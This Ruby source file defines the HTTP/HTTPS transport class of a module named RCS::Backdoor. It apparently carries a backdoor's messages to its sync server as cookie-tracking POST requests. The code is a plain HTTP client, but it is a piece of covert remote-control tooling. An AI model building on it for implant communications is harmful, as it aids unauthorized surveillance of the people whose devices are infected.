#
# Implementation of the transport layer (HTTP in our case)
#

# RCS::Common
require 'rcs-common/trace'

# System
require 'net/http'
require 'timeout'

module RCS
module Backdoor

class Transport
  include Tracer
  
  def initialize(param)
    trace :debug, "Protocol initialized #{param}"
    case param
      when :HTTP
        @host = "http://"
        @ssl = false
      when :HTTPS
        @host = "https://"
        @ssl = true
      else
        raise "Unsupported Transport"
    end
    
  end
  
  # connection to the remote host
  # for the REST protocol (HTTP) we don't have a persistent connection
  # to the sync server, just instantiate the objects here and make
  # an HTTP request every message
  def connect_to(host)
    Net::HTTP.version_1_2
    @host << host << "/service"
    
    trace_named_put(:host, @host)
    
    @uri = URI.parse(@host)
    trace :info, "Connecting to: " << @host
    @cookie = nil
        
    # the HTTP connection (better to instantiate it here, only once)
    @http = Net::HTTP.new(@uri.host, @uri.port)
    @http.use_ssl = @ssl
  end

  # every message is an HTTP POST request.
  # the protocol is always write and read.
  def message(msg)
    
    # the REST protocol is always a POST
    request = Net::HTTP::Post.new(@uri.request_uri)
    
    # the message body
    request.body = msg
    request['Content-Type'] = "application/octet-stream"
    
    # set the cookie if we already have it (got from the Auth phase)
    request['Cookie'] = @cookie if @cookie != nil
    
    res = nil
    
    # fire !
    Timeout::timeout(10) do
      res = @http.request(request)
    end
    
    trace :debug, "Cookie : " << res['Set-Cookie'] unless @cookie
    
    # save the cookie for later use
    @cookie = res['Set-Cookie']
    
    trace_named_put(:cookie, @cookie)
    
    return res.body
  end

  # nothing to do here for HTTP connections
  def disconnect
    @cookie = nil
    trace_named_remove(:cookie)
    trace_named_remove(:host)
    trace :info, "End point closed: " << @host
  end

end

end # Backdoor::
end # RCS::

if __FILE__ == $0
  # TODO Generated stub
end